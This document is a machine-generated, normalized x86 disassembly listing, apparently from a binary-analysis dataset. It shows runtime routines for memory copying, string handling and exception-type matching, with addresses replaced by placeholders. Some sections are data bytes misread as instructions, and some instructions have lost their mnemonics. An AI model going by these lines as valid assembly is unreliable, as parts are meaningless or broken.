jmp r-xdata
sub_4c44fc
push ebx
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
call sub_4d25a0
mov eax [ eax ]
test eax eax
je r-xdata
test [ eax + 0xc ] 0x6
je r-xdata
mov eax [ eax ]
test eax eax
jne r-xdata
cmp ebx [ eax + 0x52 ]
jne r-xdata
xor edx edx
mov [ eax + 0x52 ] edx
sub_4c4526
push ebx
mov ebx rw-data
push sub_4c462c
push 0x0
push 0x1
call sub_4c5930
add esp 0xc
mov eax [ eax + 0x4 ]
mov [ ebx + 0x18 ] eax
push r-xdata
push 0x0
push 0x1
call sub_4c5930
add esp 0xc
mov edx [ eax + 0x4 ]
mov [ ebx + 0x20 ] edx
push r-xdata
push 0x0
push 0x1
call sub_4c5930
add esp 0xc
mov ecx [ eax + 0x4 ]
mov [ ebx + 0x28 ] ecx
push r-xdata
push 0x0
push 0x1
call sub_4c5930
add esp 0xc
mov eax [ eax + 0x4 ]
mov [ ebx + 0x30 ] eax
push r-xdata
push 0x0
push 0x1
call sub_4c5930
add esp 0xc
mov edx [ eax + 0x4 ]
mov [ ebx + 0x38 ] edx
push r-xdata
push 0x0
push 0x1
call sub_4c5930
add esp 0xc
mov ecx [ eax + 0x4 ]
mov [ ebx + 0x40 ] ecx
push r-xdata
push 0x0
push 0x1
call sub_4c5930
add esp 0xc
mov eax [ eax + 0x4 ]
mov [ ebx + 0x48 ] eax
push r-xdata
push 0x0
push 0x1
call sub_4c5930
add esp 0xc
mov edx [ eax + 0x4 ]
mov [ ebx + 0x58 ] edx
push r-xdata
push 0x0
push 0x1
call sub_4c5930
add esp 0xc
mov ecx [ eax + 0x4 ]
mov [ ebx + 0x60 ] ecx
push r-xdata
push 0x0
push 0x1
call sub_4c5930
add esp 0xc
mov eax [ eax + 0x4 ]
mov [ ebx + 0x68 ] eax
push r-xdata
push 0x0
push 0x1
call sub_4c5930
add esp 0xc
mov edx [ eax + 0x4 ]
mov [ ebx + 0x70 ] edx
pop ebx
retn
sub_4c462c
add al 0x0
add [ eax ] al
mov al [ 0x24000c00 ]
dec ebx
dec esp
add [ ebp + 0x44 ] al
imul esi [ esi + 0x42 ] 0x72655a79
outsd
and [ esi ] ah
add [ eax + 0x49090 ] dl
add [ eax ] al
mov al [ 0xffffffffd8000c00 ]
dec edx
dec esp
add [ ebp + 0x52 ] al
popad
outsb
inc ebp
jb r-xdata
add [ eax + eax ] al
outsd
jb r-xdata
dec eax
dec esp
add [ ebp + 0x53 ] al
je r-xdata
insb
outsd
ja r-xdata
add al 0x0
add [ eax ] al
add [ es : eax + 0x490 ] dl
add [ eax - 0x73fff400 ] ah
dec edx
dec esp
add [ ebp + 0x49 ] al
outsb
je r-xdata
push esp
xchg [ esi ] cl
arpl [ ebx + 0x4f ] bp
jbe r-xdata
outsb
and [ esi ] ah
add [ eax + 0x4 ] dl
mov al [ 0xffffffffc4000c00 ]
dec eax
dec esp
add [ ebp + 0x50 ] al
jb r-xdata
add [ es : eax + 0x49090 ] dl
add [ ebp + 0x41 ] al
arpl [ ebx + 0x65 ] sp
jae r-xdata
or al 0x0
adc [ ecx + 0x4c ] cl
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x90002620
nop
nop
add al 0x0
add [ eax ] al
mov al [ 0xfffffffff4000c00 ]
inc ebp
dec edi
jbe r-xdata
call sub_4d1ec4
jb r-xdata
push sub_4c44b5
add [ ebp + 0x8 ] dh
jbe r-xdata
je r-xdata
push esi
imul ebp [ edi + 0x6c ] 0x6f697461
jbe r-xdata
inc esp
imul esi [ esi + 0x69 ] 0x26206564
add [ eax + 0x490 ] dl
add [ eax - 0x53fff400 ] ah
dec ecx
dec esp
add [ ebp + 0x4f ] al
add [ eax + eax ] cl
jb r-xdata
outsb
inc ebp
push ebp
jb r-xdata
add esp 0x8
mov eax [ rw-data ]
mov [ eax ] sub_4c44fc
retn
add [ eax ] al
insb
outsd
ja r-xdata
call sub_44bf4c
push sub_4c4810
push sub_4c47d0
call sub_4d1eac
or [ ebx + 0x4e86640d ] cl
add [ ecx - 0x792f5eff ] cl
dec esi
add dh al
add [ ecx ] al
insb
and [ gs : 0xffffffffffff9000 ] ah
nop
nop
add al 0x0
add [ eax ] al
mov al [ 0x7c000c00 ]
dec eax
mov ecx [ rw-data ]
mov [ ecx ] eax
cmp [ rw-data ] 0x0
add [ ebx + edx - 0x75 ] dh
adc eax rw-data
dec esp
add [ ebp + 0x43 ] al
outsd
outsb
je r-xdata
jl r-xdata
insb
outsd
ja r-xdata
jb r-xdata
insb
outsd
ja r-xdata
je r-xdata
add [ es : eax - 0x3d746f70 ] dl
cmp [ rw-data ] 0x0
jne r-xdata
add esp 0x8
push [ rw-data ]
outsd
insb
inc ebx
and [ esi ] ah
add [ eax + eax ] al
add [ eax ] al
mov al [ 0x2c000c00 ]
mov eax [ rw-data ]
mov [ eax ] 0x1
cmp [ edx ] 0x0
jne r-xdata
mov edx [ rw-data ]
add [ eax ] al
mov al [ 0x10000c00 ]
dec ecx
dec esp
add [ eax ] al
mov al [ 0x60000c00 ]
dec ecx
dec esp
add [ ebp + 0x55 ] al
add [ es : eax + eax ] al
dec ecx
dec esp
add [ ebp + 0x5a ] al
jb r-xdata
add [ eax ] al
add [ eax - 0xbfff400 ] ah
mov al [ 0x40000c00 ]
dec edx
dec esp
add [ ebp + 0x49 ] al
outsb
jbe r-xdata
add [ es : eax + 0x4 ] dl
cmp [ rw-data ] 0x0
sub_4c4760
mov eax edx
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax ] 0x1
call sub_44bf4c
push sub_4c4810
push sub_4c47d0
call sub_4d1eac
add esp 0x8
push [ rw-data ]
push sub_4c44b5
call sub_4d1ec4
add esp 0x8
mov eax [ rw-data ]
mov [ eax ] sub_4c44fc
retn
cmp [ rw-data ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov [ ecx ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp [ edx ] 0x0
jne r-xdata
sub_4c47d0
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
call sub_4475f4
mov ebx eax
test esi esi
je r-xdata
test ebx ebx
je r-xdata
push 0x10
call sub_4c428c
pop ecx
mov edx [ esi + 0xc ]
mov [ eax + 0x4 ] edx
mov [ eax + 0xc ] esi
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ eax ] ebx
call sub_447600
xor eax eax
mov eax [ ebx + 0xc ]
jmp r-xdata
pop esi
pop ebx
pop ebp
retn
sub_4c4c50
push ebp
mov ebp esp
add esp 0xffffffe8
call sub_447538
test al al
jne r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
mov edx [ ebp + 0xc ]
mov [ ebp - 0x14 ] edx
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x10 ] ecx
mov eax [ ebp + 0x14 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x18 ]
mov edx [ ebp + 0x18 ]
mov [ ebp - 0x8 ] edx
mov ecx [ ebp + 0x1c ]
mov [ ebp - 0x4 ] ecx
call sub_447524
sub_4c4c90
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
jecxz r-xdata
xor eax eax
jmp r-xdata
mov al [ ebp + 0xc ]
cld
[ edi ]
jne r-xdata
pop edi
pop ebp
retn
lea eax [ edi - 0x1 ]
sub_4c4cb0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax edi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
shr ecx 0x1
shr ecx 0x1
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
retn
sub_4c4cd4
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax edi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
shr ecx 0x1
cld
[ edi ] [ esi ]
mov ecx edx
shl ecx 0x1
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
retn
sub_4c4cf8
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
cmp edi esi
jb r-xdata
cld
shr ecx 0x1
shr ecx 0x1
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
je r-xdata
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebp
retn
std
lea esi [ esi + ecx - 0x1 ]
lea edi [ edi + ecx - 0x1 ]
and ecx 0x3
[ edi ] [ esi ]
mov ecx edx
shr ecx 0x1
shr ecx 0x1
sub esi 0x3
sub edi 0x3
[ edi ] [ esi ]
cld
jmp r-xdata
sub_4c4d44
push ebp
mov ebp esp
push edi
mov al [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov ah al
test edx 0xfffffffc
je r-xdata
and edx 0x3
je r-xdata
mov [ edi ] ax
lea ecx [ edi + edx - 0x4 ]
mov [ edi + 0x2 ] ax
mov eax [ edi ]
shr edx 0x3
je r-xdata
mov eax [ ebp + 0x8 ]
pop edi
pop ebp
retn
mov [ edi ] al
dec dl
je r-xdata
mov [ ecx ] eax
mov eax [ ebp + 0x8 ]
pop edi
pop ebp
retn
mov [ edi ] eax
mov [ edi + 0x4 ] eax
dec edx
je r-xdata
mov [ edi + edx - 0x1 ] ax
mov [ ecx ] eax
mov [ ecx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
pop edi
pop ebp
retn
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] eax
dec edx
je r-xdata
mov [ edi + 0x10 ] eax
mov [ edi + 0x14 ] eax
dec edx
je r-xdata
mov [ edi + 0x18 ] eax
mov [ edi + 0x1c ] eax
dec edx
je r-xdata
mov [ edi + 0x20 ] eax
mov [ edi + 0x24 ] eax
dec edx
je r-xdata
mov [ edi + 0x28 ] eax
mov [ edi + 0x2c ] eax
lea edi [ edi + 0x30 ]
dec edx
jne r-xdata
sub_4c4dec
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov ecx 0xffffffff
xor al al
cld
[ edi ]
lea esi [ edi - 0x1 ]
mov edi [ ebp + 0xc ]
mov ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
xchg edi esi
mov edx ecx
shr ecx 0x1
shr ecx 0x1
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebp
retn
sub_4c4e28
push ebp
mov ebp esp
push ebx
mov edx [ ebp + 0x8 ]
mov ecx edx
mov al [ ebp + 0xc ]
cld
mov eax edx
jmp r-xdata
test bl bl
je r-xdata
pop ebx
pop ebp
retn
xor eax eax
jmp r-xdata
mov bl [ edx + 0x1 ]
cmp al bl
je r-xdata
lea eax [ edx + 0x1 ]
jmp r-xdata
test bl bl
je r-xdata
mov bl [ edx + 0x2 ]
cmp al bl
je r-xdata
lea eax [ edx + 0x2 ]
jmp r-xdata
test bl bl
je r-xdata
mov bl [ edx + 0x3 ]
cmp al bl
je r-xdata
lea eax [ edx + 0x3 ]
add edx 0x4
test bl bl
jne r-xdata
mov bl [ edx ]
cmp al bl
je r-xdata
sub_4c4e7c
mov eax [ esp + 0x4 ]
test al 0x3
jne r-xdata
add eax 0x4
test [ eax - 0x4 ] 0xff
je r-xdata
mov edx [ eax ]
add eax 0x4
mov ecx edx
sub edx 0x1010101
and edx 0x80808080
je r-xdata
dec eax
test [ eax - 0x3 ] 0xff
je r-xdata
not ecx
and edx ecx
je r-xdata
dec eax
test [ eax - 0x2 ] 0xff
je r-xdata
test dl dl
jne r-xdata
dec eax
dec eax
and al 0xfc
jmp r-xdata
test dh dh
jne r-xdata
test edx 0xff0000
jne r-xdata
jmp r-xdata
mov ecx [ esp + 0x4 ]
dec eax
sub eax ecx
retn
sub_4c4ed8
push ebp
mov ebp esp
push edi
push ebx
mov edi [ ebp + 0x8 ]
mov ecx 0xffffffff
xor al al
cld
[ edi ]
mov ecx [ ebp + 0x10 ]
lea ebx [ edi - 0x1 ]
and ecx 0x3
mov edx [ ebp + 0xc ]
jecxz r-xdata
mov ecx [ ebp + 0x10 ]
shr ecx 0x2
jecxz r-xdata
mov al [ edx ]
mov [ ebx ] al
test al al
je r-xdata
mov [ ebx ] 0x0
mov al [ edx ]
mov [ ebx ] al
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
pop ebx
pop edi
pop ebp
retn
inc edx
inc ebx
dec ecx
jne r-xdata
mov al [ edx + 0x1 ]
mov [ ebx + 0x1 ] al
test al al
je r-xdata
mov al [ edx + 0x2 ]
mov [ ebx + 0x2 ] al
test al al
je r-xdata
mov al [ edx + 0x3 ]
add edx 0x4
mov [ ebx + 0x3 ] al
add ebx 0x4
test al al
je r-xdata
dec ecx
jne r-xdata
sub_4c4f48
push ebp
mov ebp esp
push esi
push edi
cld
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
xor eax eax
jmp r-xdata
lodsb [ esi ]
scasb [ edi ]
jne r-xdata
pop edi
pop esi
pop ebp
retn
sbb eax eax
or eax 0x1
test al al
jne r-xdata
dec ecx
js r-xdata
sub_4c4f7c
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov al [ ecx ]
mov dl [ esi ]
cmp dl al
jne r-xdata
mov al [ ecx ]
mov dl [ esi ]
cmp dl al
jne r-xdata
xor eax eax
jmp r-xdata
mov al [ ecx + 0x1 ]
mov dl [ esi + 0x1 ]
cmp dl al
jne r-xdata
xor ecx ecx
mov cl al
xor eax eax
mov al dl
sub ecx eax
mov eax ecx
inc ecx
inc esi
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov al [ ecx + 0x2 ]
mov dl [ esi + 0x2 ]
cmp dl al
jne r-xdata
mov al [ ecx + 0x3 ]
mov dl [ esi + 0x3 ]
cmp dl al
jne r-xdata
sub edi 0x4
add ecx 0x4
add esi 0x4
cmp edi 0x4
jge r-xdata
cmp edi 0x4
jl r-xdata
sub_4c4fe8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
call sub_4c4e7c
pop ecx
mov esi eax
inc esi
push esi
call sub_4c428c
pop ecx
mov ebx eax
test eax eax
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
push esi
push edi
push ebx
call sub_4c4cb0
add esp 0xc
sub_4c501c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push edi
call sub_4c4e7c
pop ecx
mov ebx eax
cmp ebx [ ebp + 0x10 ]
jbe r-xdata
push ebx
push edi
push esi
call sub_4c4cb0
add esp 0xc
mov edx [ ebp + 0x10 ]
sub edx ebx
add ebx esi
push edx
push 0x0
push ebx
call sub_4c4d44
add esp 0xc
mov eax [ ebp + 0x10 ]
push eax
push edi
push esi
call sub_4c4cb0
add esp 0xc
jmp r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4c506c
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
push ebx
call sub_4c4e7c
pop ecx
add eax ebx
jmp r-xdata
mov edx esi
cmp dl [ eax ]
jne r-xdata
cmp ebx eax
jne r-xdata
pop esi
pop ebx
pop ebp
retn
dec eax
xor eax eax
jmp r-xdata
sub_4c5098
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov ecx eax
cmp [ esi ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ eax ] 0x0
jne r-xdata
cmp [ ecx ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ ecx ]
cmp dl [ esi ]
jne r-xdata
xor eax eax
inc ecx
mov edx ecx
mov eax esi
jmp r-xdata
cmp [ edx ] 0x0
je r-xdata
cmp [ eax ] 0x0
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
mov eax ecx
jmp r-xdata
movsx ebx [ eax ]
movsx edi [ edx ]
sub ebx edi
je r-xdata
inc eax
inc edx
sub_4c50ec
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
pop ebp
retn
inc eax
mov cl [ edx + 0x1 ]
mov [ eax ] cl
test cl cl
je r-xdata
inc eax
mov cl [ edx + 0x2 ]
mov [ eax ] cl
test cl cl
je r-xdata
inc eax
mov cl [ edx + 0x3 ]
add edx 0x4
mov [ eax ] cl
test cl cl
je r-xdata
inc eax
jmp r-xdata
mov cl [ edx ]
mov [ eax ] cl
test cl cl
je r-xdata
sub_4c513c
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_4c5124
pop ecx
mov ebx eax
xor ecx ecx
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax esi
cmp ebx ecx
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + ebx * 2 ] 0x0
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
pop ebp
retn
mov si [ eax ]
mov [ edx ] si
inc ecx
add edx 0x2
add eax 0x2
cmp ebx ecx
ja r-xdata
sub_4c517c
push ebx
mov ebx ebp
add ebx [ eax + 0x8 ]
mov [ ebx + 0x8 ] eax
lea eax [ esp + 0x8 ]
mov [ ebx + 0xc ] eax
mov [ ebx + 0x4 ] r-xdata
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0x12 ] 0x0
mov [ ebx + 0x1c ] 0x0
mov eax [ fs : 0x0 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
pop ebx
retn
sub_4c51ec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
test [ edi + 0x4 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x1
jne r-xdata
push 0x13b
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
mov edx [ ebp + 0x8 ]
test [ edx + 0xc ] 0x4
jne r-xdata
push 0x13c
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
mov ecx [ ebp + 0x8 ]
movzx ebx [ ecx + 0x12 ]
add ebx [ ebp + 0x8 ]
push 0x13e
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
mov edx [ ebp + 0x8 ]
movzx ebx [ edx + 0x10 ]
add ebx [ ebp + 0x8 ]
test [ ebx + 0x8 ] 0x8
jne r-xdata
xor eax eax
cmp [ ebp + 0x14 ] 0x0
je r-xdata
add ebx 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebx + 0x8 ]
and eax 0x3
cmp eax 0x3
je r-xdata
mov esi [ ebx ]
test esi esi
je r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebx + 0x8 ]
and eax 0x3
cmp eax 0x3
je r-xdata
mov [ ebp - 0x8 ] edx
push esi
push edi
call sub_4c5724
add esp 0x8
test eax eax
je r-xdata
mov edx 0x1
mov [ ebp - 0x4 ] edx
push esi
push edi
call sub_4c5724
add esp 0x8
test eax eax
je r-xdata
mov edx 0x1
test [ esi + 0xc ] 0x4
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
test [ esi + 0xc ] 0x4
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
add ebx 0xc
jmp r-xdata
push [ ebp - 0x8 ]
push [ ebp + 0x10 ]
push edi
push esi
call sub_4c51ec
add esp 0x10
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x10 ]
push edi
push esi
call sub_4c51ec
add esp 0x10
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
mov esi [ ebx ]
test esi esi
je r-xdata
mov eax 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax 0x1
jmp r-xdata
sub_4c5343
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov eax rw-data
call sub_4c517c
xor esi esi
inc esi
cmp esi 0x100
jl r-xdata
test eax eax
je r-xdata
mov eax [ esi * 4 + rw-data ]
test eax eax
je r-xdata
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ebx [ eax + 0xc ]
test eax eax
je r-xdata
mov eax ebx
test eax eax
jne r-xdata
push 0x3
push eax
mov eax [ eax ]
call [ eax ]
add esp 0x8
sub_4c5396
push ebp
mov ebp esp
add esp 0xffffffe8
xor eax eax
xor edx edx
xor ecx ecx
push ebx
push esi
push edi
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] ecx
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x350
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
mov eax [ ebp + 0xc ]
test [ eax + 0x4 ] 0x1
jne r-xdata
push 0x351
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
mov edx [ ebp + 0x14 ]
test [ edx + 0x4 ] 0x1
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
mov ecx [ ebp + 0x1c ]
test [ ecx + 0x4 ] 0x1
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x1c ]
call sub_4c5724
add esp 0x8
test eax eax
je r-xdata
push 0x352
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
push 0x35c
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_4c5724
add esp 0x8
test eax eax
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x1c ]
call sub_4c5724
add esp 0x8
test eax eax
je r-xdata
push 0x356
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
xor edx edx
mov [ ebp - 0x4 ] edx
mov ecx [ ebp + 0xc ]
movzx ebx [ ecx + 0x12 ]
add ebx [ ebp + 0xc ]
xor eax eax
jmp r-xdata
mov edx [ ebp + 0xc ]
test [ edx + 0xc ] 0x4
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
test [ ebx + 0x8 ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x20 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
cmp [ ebp - 0x10 ] 0x1
je r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
movzx ebx [ eax + 0x10 ]
add ebx [ ebp + 0xc ]
jmp r-xdata
add ebx 0xc
jmp r-xdata
cmp [ ebp + 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov edi [ ebx ]
test edi edi
je r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebx + 0x8 ]
and eax 0x3
cmp eax 0x3
je r-xdata
mov [ ebp - 0x14 ] edx
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0x28 ]
add esi [ ebx + 0x4 ]
mov [ ebp - 0x18 ] eax
test [ ebx + 0x8 ] 0x4
je r-xdata
mov edx 0x1
push edi
push [ ebp + 0x14 ]
call sub_4c5724
add esp 0x8
test eax eax
jne r-xdata
mov esi [ esi ]
mov [ ebp - 0x18 ] edi
cmp [ ebp + 0x10 ] 0x0
je r-xdata
test [ edi + 0xc ] 0x4
je r-xdata
cmp [ ebp + 0x18 ] 0x0
je r-xdata
cmp esi [ ebp + 0x10 ]
jne r-xdata
push [ ebp - 0x18 ]
push [ ebp - 0x14 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push edi
push esi
call sub_4c5396
add esp 0x24
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
mov eax esi
jmp r-xdata
mov esi eax
mov eax [ ebp + 0x20 ]
mov edx [ eax ]
mov [ ebp - 0x14 ] edx
jmp r-xdata
inc [ ebp - 0x10 ]
mov [ ebp - 0xc ] esi
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x8 ] ecx
cmp esi [ ebp - 0xc ]
jne r-xdata
push 0x0
push 0x0
push [ ebp + 0x20 ]
push 0x0
push 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push edi
push esi
call sub_4c5396
add esp 0x24
test eax eax
jne r-xdata
push 0x3d1
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
mov edx [ ebp - 0x14 ]
or [ ebp - 0x8 ] edx
jmp r-xdata
jmp r-xdata
sub_4c55ff
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
cmp [ edi ] 0x0
jne r-xdata
mov ebx [ esi ]
test ebx ebx
jne r-xdata
push 0x516
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
mov edx [ edi ]
add edx [ esi + 0x4 ]
mov [ ebp - 0x4 ] edx
cmp [ ebp + 0xc ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
push [ ebp + 0x10 ]
push ebx
call sub_4c5724
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ecx ]
mov [ ebp - 0x4 ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
test [ ebx + 0x4 ] 0x2
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax 0x1
mov [ edi ] edx
jmp r-xdata
add esi 0xc
jmp r-xdata
movzx eax [ ebx + 0x10 ]
add eax ebx
test eax eax
je r-xdata
lea edx [ ebp - 0x4 ]
push edx
push [ ebp + 0x10 ]
push 0x0
push eax
call sub_4c55ff
add esp 0x10
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax 0x1
mov [ edi ] ecx
jmp r-xdata
sub_4c56ec
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
cmp [ ebx + 0x6 ] 0x0
jne r-xdata
mov eax rw-data
pop ebx
pop ebp
retn
movzx eax [ ebx + 0x6 ]
add eax ebx
pop ebx
pop ebp
retn
push 0x22
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
sub_4c5724
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
push 0x105
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
cmp esi ebx
jne r-xdata
push 0x106
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
mov dx [ ebx + 0x4 ]
cmp dx [ esi + 0x4 ]
jne r-xdata
mov eax 0x1
jmp r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebx ]
cmp ecx [ esi ]
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov dx [ ebx + 0x4 ]
or dx [ esi + 0x4 ]
test dl 0x80
je r-xdata
movzx edi [ ebx + 0x6 ]
add edi ebx
cmp [ ebx + 0x6 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
movzx ebx [ esi + 0x6 ]
add ebx esi
cmp [ esi + 0x6 ] 0x0
jne r-xdata
push 0x11e
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
movsx eax [ edi ]
movsx edx [ ebx ]
inc ebx
inc edi
cmp edx eax
je r-xdata
push 0x11f
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov eax 0x1
sub_4c5800
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
movzx edi [ ebx + 0x4 ]
movzx edx [ esi + 0x4 ]
mov [ ebp - 0x4 ] edx
mov ecx [ ebp - 0x4 ]
and ecx edi
test cl 0x10
je r-xdata
mov eax 0x1
jmp r-xdata
mov edx [ ebp - 0x4 ]
and edx edi
test dh 0x4
je r-xdata
and edi 0x300
and [ ebp - 0x4 ] 0x300
cmp edi [ ebp - 0x4 ]
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push esi
push ebx
call sub_4c5724
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebx + 0xc ]
cmp ecx [ esi + 0xc ]
je r-xdata
mov eax 0x1
mov ebx [ ebx + 0x8 ]
mov esi [ esi + 0x8 ]
jmp r-xdata
test eax eax
jne r-xdata
test edi 0x2
je r-xdata
mov eax 0x1
jmp r-xdata
mov eax 0x1
mov ebx [ ebx + 0x8 ]
mov esi [ esi + 0x8 ]
jmp r-xdata
test eax eax
jne r-xdata
cmp esi ebx
jne r-xdata
xor eax eax
jmp r-xdata
mov eax edi
mov edx [ ebp - 0x4 ]
and edx 0x300
and eax 0x300
cmp eax edx
je r-xdata
xor eax eax
